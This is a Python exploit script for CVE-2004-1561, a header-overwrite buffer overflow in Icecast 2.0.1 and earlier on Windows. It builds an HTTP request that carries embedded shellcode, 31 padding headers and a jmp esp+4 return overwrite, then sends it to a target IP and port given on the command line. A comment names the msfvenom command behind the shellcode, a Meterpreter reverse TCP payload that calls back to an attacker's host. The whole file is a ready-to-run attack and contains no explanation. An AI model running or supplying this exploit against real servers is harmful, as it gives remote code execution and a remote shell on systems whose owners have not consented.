#!/usr/bin/python                                                                                                                                                                                        
# Icecast (<= 2.0.1) Header Overwrite (win32)                                                                                                                                                            
# CVE-2004-1561                                                                                                                                                                                          
# Discovered by Luigi Auriemma                                                                                                                                                                           
                                                                                                                                                                                                         
import socket                                                                                                                                                                                            
import sys                                                                                                                                                                                               
                                                                                                                                                                                                         
"""                                                                                                                                                                                                      
Usage Example:                                                                                                                                                                                           
                                                                                                                                                                                                         
./icecast-bof.py 10.10.179.99 8000                                                                                                                                                                       
                                                                                                                                                                                                         
"""                                                                                                                                                                                                      
                                                                                                                                                                                                         
if len(sys.argv) != 3:                                                                                                                                                                                   
    print("Usage: ./icecast-bof.py <IP> <PORT>")                                                                                                                                                         
    sys.exit()                                                                                                                                                                                           
                                                                                                                                                                                                         
host = sys.argv[1] # Target IP                                                                                                                                                                           
port = int(sys.argv[2]) # Target Port - Typically 8000                                                                                                                                                    

#msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f python -b "\x0d\x0a\x00" EXITFUNC=thread

buf = ""                                                                                                                                                                                                 
buf += "\xb8\xb7\xb6\xa4\x14\xd9\xc1\xd9\x74\x24\xf4\x5f\x29"                                                                                                                                            
buf += "\xc9\xb1\x5b\x83\xef\xfc\x31\x47\x10\x03\x47\x10\x55"                                                                                                                                            
buf += "\x43\x58\xfc\x1b\xac\xa1\xfd\x7b\x24\x44\xcc\xbb\x52"                                                                                                                                            
buf += "\x0c\x7f\x0b\x10\x40\x8c\xe0\x74\x71\x07\x84\x50\x76"                                                                                                                                            
buf += "\xa0\x22\x87\xb9\x31\x1e\xfb\xd8\xb1\x5c\x28\x3b\x8b"                                                                                                                                            
buf += "\xaf\x3d\x3a\xcc\xcd\xcc\x6e\x85\x9a\x63\x9f\xa2\xd6"                                                                                                                                            
buf += "\xbf\x14\xf8\xf7\xc7\xc9\x49\xf6\xe6\x5f\xc1\xa1\x28"                                                                                                                                            
buf += "\x61\x06\xda\x60\x79\x4b\xe6\x3b\xf2\xbf\x9d\xbd\xd2"                                                                                                                                            
buf += "\xf1\x5e\x11\x1b\x3e\xad\x6b\x5b\xf9\x4d\x1e\x95\xf9"                                                                                                                                            
buf += "\xf0\x19\x62\x83\x2e\xaf\x71\x23\xa5\x17\x5e\xd5\x6a"
buf += "\xc1\x15\xd9\xc7\x85\x72\xfe\xd6\x4a\x09\xfa\x53\x6d"
buf += "\xde\x8a\x27\x4a\xfa\xd7\xfc\xf3\x5b\xb2\x53\x0b\xbb"
buf += "\x1d\x0c\xa9\xb7\xb0\x59\xc0\x95\xdc\xae\xe9\x25\x1d"
buf += "\xb8\x7a\x55\x2f\x67\xd1\xf1\x03\xe0\xff\x06\x15\xe6"
buf += "\xff\xd9\x9d\x66\xfe\xd9\xdd\xaf\xc5\x8e\x8d\xc7\xec"
buf += "\xae\x45\x17\x10\x7b\xf3\x1d\x86\x8e\x0c\x34\x8f\xe7"
buf += "\x0e\x36\x3e\xa4\x87\xd0\x10\x04\xc8\x4c\xd1\xf4\xa8"
buf += "\x3c\xb9\x1e\x27\x63\xd9\x20\xed\x0c\x70\xcf\x58\x65"
buf += "\xed\x76\xc1\xfd\x8c\x77\xdf\x78\x8e\xfc\xea\x7d\x41"
buf += "\xf5\x9f\x6d\xb6\x62\x60\x6d\x47\x07\x60\x07\x43\x81"
buf += "\x37\xbf\x49\xf4\x70\x60\xb1\xd3\x02\x66\x4d\xa2\x32"
buf += "\x1d\x78\x30\x7b\x49\x85\xd4\x7b\x89\xd3\xbe\x7b\xe1"
buf += "\x83\x9a\x2f\x14\xcc\x36\x5c\x85\x59\xb9\x35\x7a\xc9"
buf += "\xd1\xbb\xa5\x3d\x7e\x43\x80\x3d\x79\xbb\x57\x6a\x22"
buf += "\xd4\xa7\x2a\xd2\x24\xcd\xaa\x82\x4c\x1a\x84\x2d\xbd"
buf += "\xe3\x0f\x66\xd5\x6e\xde\xc4\x44\x6f\xcb\x89\xd8\x70"
buf += "\xf8\x11\xea\x0b\x71\xa5\x0b\xec\x9b\xc2\x0b\xed\xa3"
buf += "\xf4\x30\x38\x9a\x82\x77\xf9\x99\x8d\x65\xd7\xd7\x25"
buf += "\x30\xb2\x55\x28\xc3\x69\x99\x55\x40\x9b\x62\xa2\x58"
buf += "\xee\x67\xee\xde\x03\x1a\x7f\x8b\x23\x89\x80\x9e"

buffer = "\xeb\x0c / HTTP/1.1 "
buffer += buf
buffer += "\r\n"
buffer += "Accept: text/html\r\n" * 31
buffer += "\xff\x64\x24\x04\r\n" #jmp esp+4
buffer += "\r\n"

try:
    print("\nSending buffer overlow")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(buffer)
    s.close()
    print("\nDone!")

except:
    print("Could not connect")
    sys.exit()
